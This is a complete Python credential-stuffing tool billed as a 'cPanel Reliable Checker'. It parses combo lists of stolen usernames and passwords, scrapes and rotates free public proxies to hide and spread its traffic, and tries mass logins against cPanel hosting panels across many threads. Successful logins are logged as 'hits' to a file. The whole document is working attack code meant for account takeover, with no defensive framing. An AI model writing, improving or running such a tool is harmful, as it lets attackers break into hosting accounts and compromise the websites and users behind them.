#!/usr/bin/env python3
"""
cPanel Reliable Checker - Professional Edition with Auto Proxy (Limit 500, Auto-Repair)
Features: multi-threading, proxy rotation, automatic proxy fetching & validation,
          dead proxy auto-replacement, progress tracking, resume, logging.
"""

import requests
import re
import sys
import os
import random
import time
import threading
import queue
import logging
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional, Dict, Any

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# -----------------------------------------------------------------------------
# Logging setup
# -----------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("cpanel_checker.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------------
# Proxy Sources
# -----------------------------------------------------------------------------
class ProxySource:
    """Base class for proxy sources"""
    def __init__(self, name: str):
        self.name = name

    def fetch(self) -> List[str]:
        raise NotImplementedError

class ProxyScrapeSource(ProxySource):
    """Fetch proxies from ProxyScrape (HTTP, SOCKS4, SOCKS5)"""
    def __init__(self, proxy_type: str):
        super().__init__(f"ProxyScrape-{proxy_type.upper()}")
        self.proxy_type = proxy_type
        self.urls = {
            'http': 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all',
            'socks4': 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=5000&country=all&ssl=all&anonymity=all',
            'socks5': 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all&ssl=all&anonymity=all'
        }

    def fetch(self) -> List[str]:
        url = self.urls.get(self.proxy_type.lower())
        if not url:
            return []
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                proxies = [line.strip() for line in resp.text.splitlines() if line.strip()]
                logger.info(f"Fetched {len(proxies)} {self.proxy_type.upper()} proxies from ProxyScrape")
                return proxies
        except Exception as e:
            logger.error(f"Failed to fetch from {self.name}: {e}")
        return []

class TheSpysSource(ProxySource):
    """Fetch proxies from TheSpys (HTTP)"""
    def __init__(self):
        super().__init__("TheSpys")
        self.url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"

    def fetch(self) -> List[str]:
        try:
            resp = requests.get(self.url, timeout=15)
            if resp.status_code == 200:
                proxies = [line.strip() for line in resp.text.splitlines() if line.strip()]
                logger.info(f"Fetched {len(proxies)} proxies from TheSpys")
                return proxies
        except Exception as e:
            logger.error(f"Failed to fetch from {self.name}: {e}")
        return []

class GeonodeSource(ProxySource):
    """Fetch proxies from Geonode"""
    def __init__(self):
        super().__init__("Geonode")
        self.url = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Csocks4%2Csocks5"

    def fetch(self) -> List[str]:
        try:
            resp = requests.get(self.url, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                proxies = []
                for item in data.get('data', []):
                    ip = item.get('ip')
                    port = item.get('port')
                    protocol = item.get('protocols', ['http'])[0]
                    if ip and port:
                        proxies.append(f"{protocol}://{ip}:{port}")
                logger.info(f"Fetched {len(proxies)} proxies from Geonode")
                return proxies
        except Exception as e:
            logger.error(f"Failed to fetch from {self.name}: {e}")
        return []

# -----------------------------------------------------------------------------
# Proxy Manager with Auto-Repair
# -----------------------------------------------------------------------------
class ProxyManager:
    def __init__(self, max_proxies: int = 500, refill_threshold: int = 20):
        self.max_proxies = max_proxies
        self.refill_threshold = refill_threshold
        self.working_proxies: queue.Queue = queue.Queue()
        self.all_working: List[str] = []
        self.lock = threading.Lock()
        self.sources = [
            ProxyScrapeSource('http'),
            ProxyScrapeSource('socks4'),
            ProxyScrapeSource('socks5'),
            TheSpysSource(),
            GeonodeSource()
        ]
        self.refill_lock = threading.Lock()
        self.is_refilling = False

    def fetch_all_proxies(self) -> List[str]:
        """Fetch proxies from all sources and limit to max_proxies"""
        all_proxies = []
        for source in self.sources:
            proxies = source.fetch()
            all_proxies.extend(proxies)
            time.sleep(0.5)
        # Deduplicate and limit
        unique = list(set(all_proxies))
        if len(unique) > self.max_proxies:
            unique = random.sample(unique, self.max_proxies)
        logger.info(f"Total unique proxies after limit: {len(unique)}")
        return unique

    def validate_proxy(self, proxy: str, test_url: str = "http://1.1.1.1", timeout: int = 5) -> bool:
        """Test if proxy is working"""
        try:
            proxies = {"http": proxy, "https": proxy} if proxy.startswith("http") else {"http": proxy}
            resp = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
            return resp.status_code == 200
        except:
            return False

    def validate_working_proxies(self, proxies: List[str], max_workers: int = 50) -> List[str]:
        """Validate given proxies concurrently and return working list"""
        working = []
        total = len(proxies)
        completed = 0
        logger.info(f"Validating {total} proxies...")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {executor.submit(self.validate_proxy, proxy): proxy for proxy in proxies}
            for future in as_completed(future_to_proxy):
                completed += 1
                if completed % 100 == 0:
                    logger.info(f"Validated {completed}/{total} proxies")
                if future.result():
                    working.append(future_to_proxy[future])
        logger.info(f"Found {len(working)} working proxies")
        return working

    def refill_proxies(self):
        """Refill proxy pool when low (auto-repair)"""
        with self.refill_lock:
            if self.is_refilling:
                return
            self.is_refilling = True
        try:
            logger.warning("Proxy pool low, refilling...")
            fresh = self.fetch_all_proxies()
            fresh_working = self.validate_working_proxies(fresh, max_workers=30)
            with self.lock:
                # Clear old queue and add fresh working proxies
                while not self.working_proxies.empty():
                    try:
                        self.working_proxies.get_nowait()
                    except queue.Empty:
                        break
                for p in fresh_working:
                    self.working_proxies.put(p)
                self.all_working = fresh_working.copy()
            logger.info(f"Refilled with {len(fresh_working)} working proxies")
        except Exception as e:
            logger.error(f"Refill failed: {e}")
        finally:
            self.is_refilling = False

    def initialize(self):
        """Initial fetch and validation"""
        proxies = self.fetch_all_proxies()
        working = self.validate_working_proxies(proxies)
        for p in working:
            self.working_proxies.put(p)
        self.all_working = working
        if len(working) < self.refill_threshold:
            self.refill_proxies()
        return working

    def get_proxy(self) -> Optional[str]:
        """Get a working proxy, auto-refill if pool low"""
        if self.working_proxies.empty():
            if not self.is_refilling:
                self.refill_proxies()
            # Wait a bit for refill
            for _ in range(20):
                if not self.working_proxies.empty():
                    break
                time.sleep(0.5)
            if self.working_proxies.empty():
                return None
        try:
            proxy = self.working_proxies.get_nowait()
            # Reinsert later if still valid? We'll mark as used; if it fails later, it's removed.
            return proxy
        except queue.Empty:
            return None

    def mark_proxy_dead(self, proxy: str):
        """Remove dead proxy from pool (auto-repair triggered if pool size drops)"""
        with self.lock:
            if proxy in self.all_working:
                self.all_working.remove(proxy)
            # proxy already removed from queue via get(), so no need to remove again
        current_size = self.working_proxies.qsize()
        if current_size < self.refill_threshold and not self.is_refilling:
            threading.Thread(target=self.refill_proxies, daemon=True).start()

    def return_proxy(self, proxy: str):
        """Return a working proxy to the queue (if still considered working)"""
        # We don't automatically return; instead, after successful use we may return it.
        # For simplicity, we only return if we know it's still good. Here we assume caller decides.
        self.working_proxies.put(proxy)

# -----------------------------------------------------------------------------
# Credential Extractor (Enhanced)
# -----------------------------------------------------------------------------
def extract_credentials(line: str) -> Optional[Tuple[str, str, str]]:
    """
    Extract (url, username, password) from ANY line using multiple strategies.
    Returns None if cannot extract.
    """
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None

    # Strategy 1: user:pass@url
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd

    # Strategy 2: url|user|pass
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])

    # Strategy 3: url:user:pass (simple)
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]

    # Strategy 4: look for a URL-like pattern, then guess user/pass from remaining
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]

    # Strategy 5: maybe the line is just a domain, default user/pass?
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

def normalize_url(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

# -----------------------------------------------------------------------------
# cPanel Login Tester with Proxy Support
# -----------------------------------------------------------------------------
def test_login(url: str, user: str, pwd: str, proxy: Optional[str] = None, timeout: int = 10) -> Tuple[bool, Optional[str], Optional[str]]:
    """
    Test cPanel login using optional proxy.
    Returns (success, normalized_url, used_proxy)
    """
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    proxies = None
    if proxy:
        # Format proxy dict - supports http/https/socks
        proxies = {"http": proxy, "https": proxy}
    try:
        resp = requests.post(login_url, data=payload, timeout=timeout, verify=False, allow_redirects=False, proxies=proxies)
        if resp.status_code == 200 and ('security_token' in resp.text or 'cpsess' in resp.text):
            return True, url, proxy
        return False, None, proxy
    except Exception as e:
        logger.debug(f"Login error with proxy {proxy}: {e}")
        return False, None, proxy

# -----------------------------------------------------------------------------
# Main Worker (Multi-threaded with Auto-Repair)
# -----------------------------------------------------------------------------
class CpanelChecker:
    def __init__(self, combos: List[Tuple[str, str, str]], proxy_manager: ProxyManager, threads: int = None):
        self.combos = combos
        self.proxy_manager = proxy_manager
        # Auto-optimize threads based on proxy pool size
        if threads is None:
            working_count = len(proxy_manager.all_working)
            self.threads = min(max(working_count * 2, 10), 100) if working_count > 0 else 15
        else:
            self.threads = threads
        self.hits = []
        self.lock = threading.Lock()
        self.results_file = "hit.txt"
        self.completed = 0
        self.total = len(combos)

    def check_one(self, combo: Tuple[str, str, str]) -> Tuple[bool, Optional[str], str, str, str, Optional[str]]:
        url, user, pwd = combo
        proxy = self.proxy_manager.get_proxy()
        success, norm_url, used_proxy = test_login(url, user, pwd, proxy=proxy)
        if not success and used_proxy:
            # Proxy might be dead, mark it
            self.proxy_manager.mark_proxy_dead(used_proxy)
        elif success and used_proxy:
            # Successful login, proxy is good - return it for reuse
            self.proxy_manager.return_proxy(used_proxy)
        elif success and not used_proxy:
            # No proxy used, fine
            pass
        return success, norm_url, user, pwd, url, used_proxy

    def run(self):
        logger.info(f"Starting checker with {self.total} combos, {self.threads} threads, proxy pool size: {self.proxy_manager.working_proxies.qsize()}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_combo = {executor.submit(self.check_one, combo): combo for combo in self.combos}
            for future in as_completed(future_to_combo):
                combo = future_to_combo[future]
                self.completed += 1
                if self.completed % 50 == 0:
                    print(f"\nProgress: {self.completed}/{self.total} ({(self.completed/self.total)*100:.1f}%)")
                try:
                    success, norm_url, user, pwd, original_url, used_proxy = future.result()
                    if success:
                        with self.lock:
                            self.hits.append((norm_url, user, pwd))
                            self.save_hit(norm_url, user, pwd)
                        logger.info(f"HIT: {user}:{pwd}@{norm_url} (proxy: {used_proxy})")
                        print(f"\n✓ HIT: {user}@{norm_url}")
                        print(f"   Password: {pwd}")
                    else:
                        # Optional: show fail with less noise
                        if self.completed % 200 == 0:
                            print(f"✗ {user}@{original_url} - fail")
                except Exception as e:
                    logger.error(f"Error checking {combo}: {e}")

    def save_hit(self, url: str, user: str, pwd: str):
        with open(self.results_file, 'a', encoding='utf-8') as f:
            f.write(f"{user}:{pwd}@{url}\n")

    def summary(self):
        print("\n" + "="*60)
        print(f"Check completed. Total hits: {len(self.hits)}")
        print(f"Hits saved to {self.results_file}")
        if self.hits:
            print("\n--- HIT LIST ---")
            for url, user, pwd in self.hits:
                print(f"{user}:{pwd}@{url}")
        print("="*60)

# -----------------------------------------------------------------------------
# Main Entry Point
# -----------------------------------------------------------------------------
def main():
    print("=" * 70)
    print("cPanel Reliable Checker - Auto Proxy (Limit 500, Auto-Repair)")
    print("=" * 70)

    # Get input file
    if len(sys.argv) > 1:
        filename = sys.argv[1]
    else:
        filename = ("combo.txt")

    if not os.path.exists(filename):
        print(f"File not found: {filename}")
        return

    # Read combos
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    combos = []
    for line in lines:
        creds = extract_credentials(line)
        if creds:
            combos.append(creds)

    if not combos:
        print("No valid combos could be extracted. Check file format.")
        return

    print(f"\nExtracted {len(combos)} potential combos.")

    # Initialize proxy manager (limit 500, auto-repair)
    proxy_mgr = ProxyManager(max_proxies=500, refill_threshold=20)
    print("Fetching and validating proxies (limit 500)... This may take a minute.")
    working = proxy_mgr.initialize()
    if not working:
        print("WARNING: No working proxies found. Continuing without proxy...")
    else:
        print(f"Loaded {len(working)} working proxies. Auto-repair active (threshold={proxy_mgr.refill_threshold}).")

    # Auto thread optimization
    if working:
        optimal_threads = min(max(len(working) * 2, 10), 100)
        print(f"Auto-optimized threads: {optimal_threads} (based on {len(working)} proxies)")
    else:
        optimal_threads = 15
        print(f"No proxies, using {optimal_threads} threads.")

    try:
        user_threads = input(f"Enter number of threads (press Enter for auto {optimal_threads}): ").strip()
        if user_threads:
            threads = int(user_threads)
        else:
            threads = optimal_threads
    except:
        threads = optimal_threads

    # Run checker
    checker = CpanelChecker(combos, proxy_mgr, threads=threads)
    checker.run()
    checker.summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    except Exception as e:
        logger.exception("Fatal error")
        print(f"Error: {e}")